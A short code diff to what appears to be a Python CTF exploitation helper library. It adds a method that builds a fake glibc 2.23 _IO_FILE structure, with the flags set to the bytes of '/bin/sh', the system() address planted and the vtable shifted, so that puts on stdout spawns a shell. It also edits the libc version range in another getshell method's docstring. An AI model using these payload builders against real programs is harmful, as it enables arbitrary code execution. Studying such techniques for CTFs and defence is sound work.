@@ -114,9 +114,27 @@ class IO_FILE_plus_struct(FileStructure):
             print("  {} : {} ".format(hex(k), v))
 
 
+    def getshell_from_IO_puts_by_stdout_libc_2_23(self, stdout_store_addr:int, system_addr:int, lock_addr:int):
+        """Exec shell by IO_puts by _IO_2_1_stdout_ in libc-2.23.so
+
+        Args:
+            stdout_store_addr (int): The address stored in stdout. Probably is libc.sym['_IO_2_1_stdout_'].
+            system_addr (int): System address.
+            lock_addr (int): Lock address.
+
+        Returns:
+            bytes: payload.
+        """
+        self.flags = 0x68732f6e69622f
+        self._IO_save_base = system_addr
+        self._lock = lock_addr
+        self.vtable = stdout_store_addr + 0x10
+        return self.__bytes__()
+
+
     # only support amd64
     def getshell_by_str_jumps_finish_when_exit(self, _IO_str_jumps_addr:int, system_addr:int, bin_sh_addr:int):
-        """Execute system("/bin/sh) through fake IO_FILE struct, and the version of libc should lower than 2.29.
+        """Execute system("/bin/sh) through fake IO_FILE struct, and the version of libc should between 2.24 and 2.29.
 
         Usually, you have hijacked _IO_list_all, and will call _IO_flush_all_lockp by exit or other function.
 
